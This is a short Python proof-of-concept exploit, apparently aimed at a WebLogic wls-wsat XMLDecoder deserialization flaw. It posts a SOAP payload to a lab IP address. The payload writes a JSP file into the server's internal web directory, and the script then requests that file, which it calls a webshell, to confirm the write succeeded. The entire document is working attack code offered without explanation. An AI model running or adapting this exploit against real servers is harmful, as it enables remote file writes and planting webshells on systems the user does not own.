import requests
url=r'http://192.168.58.130:7001/wls-wsat/CoordinatorPortType'
payload='''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java><java version="1.4.0" class="java.beans.XMLDecoder">
        <object class="java.io.PrintWriter"> 
        <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test1.jsp</string>
        <void method="println"><string>
        <![CDATA[
    <% out.print("test"); %>
        ]]>
        </string>
        </void>
        <void method="close"/>
        </object></java></java>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
    </soapenv:Envelope>'''
headers={
    'Accept-Encoding':'gzip, deflate',
    'Accept':'*/*',
    'Accept-Language':'en',
    'User-Agent':'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
    'Connection':'close',
    'Content-Type':'text/xml',
    'Content-Length':'638' 
    }
requests.post(url=url,data=payload,headers=headers)
webshell_path=r'http://192.168.58.130:7001/bea_wls_internal/test1.jsp'
res = requests.get(url=webshell_path)
print(res.text)